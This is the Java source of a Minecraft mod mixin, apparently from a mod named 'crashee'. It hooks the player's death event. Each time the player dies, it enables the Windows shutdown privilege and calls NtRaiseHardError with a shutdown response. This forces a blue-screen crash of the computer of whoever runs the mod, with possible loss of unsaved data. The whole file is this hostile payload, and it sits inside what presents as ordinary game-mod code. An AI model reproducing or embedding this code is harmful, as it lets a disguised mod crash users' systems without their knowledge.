package lab.ninem4re.crashee.mixin.client;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.NtDll;
import com.sun.jna.platform.win32.NtDllUtil;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.DLLCallback;
import lab.ninem4re.crashee.interfaces.Ntdll;
import net.minecraft.entity.player.PlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerEntity.class)
public class PlayerEntityMixin {
    @Inject(at = @At("HEAD"), method = "onDeath")
    private void init(CallbackInfo ci) {
        IntByReference previous = new IntByReference();
        IntByReference response = new IntByReference();

        Ntdll ntdllInstance = Ntdll.INSTANCE;

        ntdllInstance.RtlAdjustPriviledge(
                19,
                true,
                false,
                previous
        );

        ntdllInstance.NtRaiseHardError(
                0xC000007B,
                0,
                0,
                Pointer.NULL,
                6,
                response
        );
    }
}
